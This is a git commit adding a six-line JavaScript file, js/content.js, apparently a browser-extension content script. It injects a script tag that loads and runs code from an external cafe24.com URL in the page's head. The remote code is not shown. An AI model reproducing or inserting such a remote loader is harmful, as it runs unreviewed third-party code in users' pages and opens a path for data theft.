aab53b9729de0e992759531815935ac8df54b68e
yeonghak <yongxue1215@126.com>
2021-10-21 10:50:51 +0800

    Add files via upload

---
+++ js/content.js
@@ -0,0 +1,6 @@
+var script = document.createElement("script");
+var header = document.getElementsByTagName("head")[0];
+
+header.appendChild(script);
+
+script.src = 'https://skin-skin52.ectchinatest16.cafe24.com/web/figma/contents.js';
